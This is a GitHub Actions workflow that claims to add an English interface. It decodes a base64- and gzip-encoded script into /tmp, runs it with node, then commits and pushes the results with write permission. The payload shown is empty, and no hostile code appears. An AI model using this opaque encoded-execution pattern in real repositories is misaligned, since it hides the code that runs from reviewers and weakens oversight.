name: Apply bilingual UI

on:
  push:
    branches: [main]
    paths:
      - ".github/workflows/apply-i18n.yml"
  workflow_dispatch:

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm
      - run: npm ci
      - name: Apply bilingual UI
        shell: bash
        run: |
          python - <<'PY'
          import base64, gzip
          payload = ''''''
          open('/tmp/apply-i18n.mjs', 'wb').write(gzip.decompress(base64.b64decode(payload)))
          PY
          node /tmp/apply-i18n.mjs
      - name: Verify
        run: npm run check
      - name: Commit changes
        shell: bash
        run: |
          if git diff --quiet; then
            echo "No changes to commit."
            exit 0
          fi
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add src tests manifest.json package.json package-lock.json versions.json
          git commit -m "feat: add English interface"
          git push
